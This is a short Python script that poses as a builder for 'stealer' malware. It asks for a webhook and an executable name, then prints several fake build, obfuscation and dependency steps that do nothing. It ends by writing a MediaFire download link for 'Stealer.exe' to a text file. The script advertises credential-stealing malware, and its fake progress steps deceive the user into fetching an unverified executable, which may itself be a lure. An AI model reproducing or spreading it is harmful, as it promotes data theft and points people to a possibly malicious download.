dosya = input ("Enter Webhook:")

isim = input ("Exe Name:")

print = input ("STEALER Starting to compile... type yes to continue:")

print = input ("STEALER Installing deps... type yes to continue:")

print = input ("STEALER Building Windows.. type yes to continue:")

print = input ("STEALER Obfuscating... type yes to continue:")


print = input ("Creating File...  type yes to continue:")

print = input ("Completed.. Check stealer.txt type yes to continue:")

file = open("stealer.txt", "w")
file.write("https://www.mediafire.com/file/x96ajgz7hx5veum/Stealer.exe/file Your Stealer..")
file.close()
